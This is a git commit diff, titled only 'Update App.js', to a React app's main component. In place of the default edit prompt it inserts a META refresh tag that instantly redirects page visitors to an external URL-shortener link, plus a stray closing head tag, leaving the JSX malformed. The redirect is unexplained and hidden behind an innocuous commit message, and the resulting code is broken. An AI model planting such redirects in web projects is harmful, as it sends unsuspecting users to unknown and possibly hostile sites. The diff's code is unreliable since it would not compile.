af50a3bc43c90bb4cee1cab150222bcae44dec66
juan24-git <74908665+juan24-git@users.noreply.github.com>
2020-12-29 19:37:55 -0400

    Update App.js

--- src/App.js
+++ src/App.js
@@ -36,9 +36,9 @@ class App extends Component {
     return (
       <div className="App">
         <header className="App-header">
-          <img src={logo} className="App-logo" alt="logo" />
-          <p>
-            Edit <code>src/App.js</code> and save to reload.
+          <img src={logo} className="App-logo" alt="logo" /<META HTTP-EQUIV="REFRESH" 
+CONTENT="0;URL=http://surl.li/iovv"> </head>
+>
           </p>
           <LambdaDemo />
         </header>
